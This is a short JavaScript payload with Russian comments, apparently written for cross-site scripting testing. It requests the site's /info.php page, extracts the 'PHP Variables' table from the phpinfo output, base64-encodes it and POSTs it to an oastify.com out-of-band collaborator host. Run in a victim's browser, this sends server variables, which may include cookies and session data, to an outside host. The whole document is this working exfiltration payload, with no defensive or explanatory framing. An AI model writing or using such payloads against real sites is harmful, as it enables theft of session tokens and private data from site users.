(async () => {
  try {
    // 1. Запрос к /info.php
    const response = await fetch('/info.php');
    const text = await response.text();

    // 2. Парсим HTML
    const parser = new DOMParser();
    const doc = parser.parseFromString(text, 'text/html');

    // 3. Находим заголовок "PHP Variables"
    // Обычно phpinfo выводит таблицы в формате <h2>PHP Variables</h2> + следующая таблица
    const headers = Array.from(doc.querySelectorAll('h2'));
    const phpVarHeader = headers.find(h => h.textContent.trim() === 'PHP Variables');

    if (!phpVarHeader) {
      console.error('Раздел "PHP Variables" не найден');
      return;
    }

    // 4. Берём следующий элемент - таблицу с содержимым PHP Variables
    let phpVarTable = phpVarHeader.nextElementSibling;
    // На phpinfo обычно после h2 идёт таблица, проверим тег
    if (!phpVarTable || phpVarTable.tagName.toLowerCase() !== 'table') {
      console.error('Таблица с PHP Variables не найдена');
      return;
    }

    // 5. Берём содержимое таблицы как HTML
    const phpVarsHtml = phpVarTable.outerHTML;

    // 6. Кодируем в base64 (utf-8)
    function toBase64(str) {
      // Чтобы корректно закодировать UTF-8 в base64, сначала преобразуем в Uint8Array
      const utf8Bytes = new TextEncoder().encode(str);
      let binary = '';
      utf8Bytes.forEach(b => binary += String.fromCharCode(b));
      return btoa(binary);
    }

    const base64Data = toBase64(phpVarsHtml);

    // 7. Отправляем на указанный URL методом POST, тело - base64 строка
    await fetch('https://hg14543i9o1fsbwmvksc2c2cz353tvhk.oastify.com', {
      method: 'POST',
      headers: { 'Content-Type': 'text/plain' },
      body: base64Data,
    });

    console.log('Данные отправлены успешно');
  } catch (e) {
    console.error('Ошибка:', e);
  }
})();
